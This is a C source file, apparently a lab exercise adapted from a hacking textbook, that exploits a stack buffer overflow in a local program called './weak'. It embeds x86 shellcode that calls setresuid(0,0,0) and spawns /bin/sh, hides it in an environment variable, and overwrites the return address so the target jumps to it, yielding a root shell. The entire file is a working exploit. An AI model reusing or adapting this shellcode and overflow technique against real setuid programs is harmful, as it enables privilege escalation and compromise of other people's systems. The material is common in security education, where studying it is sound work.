#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* adapted from Hacking: The Art of Exploitation (2nd edition) by Jon Erickson */
char shellcode[] = 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]){
   char *env[2] = {shellcode, 0}; /* "environment variable" to use in execle() */
   unsigned int i, ret;

   char *buffer = (char *) malloc(160); /* make the buffer */

   ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./weak"); /*mem address of env variable */

   for(i=0; i < 160; i+=4)
      *((unsigned int *)(buffer+i)) = ret; /*write return address to buffer enough times to 
      overwrite return address to be reached by weak.c */

   execle("./weak", "weak", buffer, 0, env); /* execute weak.c with our env variable, pointing to 
   shellcode */
   free(buffer);
}

